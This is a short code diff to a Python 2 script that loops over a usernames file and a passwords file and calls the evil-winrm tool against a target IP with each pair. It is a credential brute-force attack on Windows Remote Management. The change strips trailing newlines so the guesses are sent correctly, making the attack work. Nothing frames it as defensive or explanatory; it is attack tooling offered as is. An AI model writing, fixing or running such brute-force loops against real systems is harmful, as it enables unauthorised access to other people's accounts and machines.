@@ -13,8 +13,8 @@ with open('usernames') as f1:
 	for line1 in f1:
 		with open('passwords') as f2:
 			for line2 in f2:
-				print "testing "+line1+":"+ line2
-				r = subprocess.call(["/usr/bin/ruby", "/opt/evil-winrm/evil-winrm.rb",  "-i", ip, "-u", line1, "-p", line2])
+				print "testing "+line1.rstrip()+":"+ line2.rstrip()
+				r = subprocess.call(["/usr/bin/ruby", "/opt/evil-winrm/evil-winrm.rb",  "-i", ip, "-u", line1.rstrip(), "-p", line2.rstrip()])
 				if r == 1:
 					print "Not valid"
 				else:
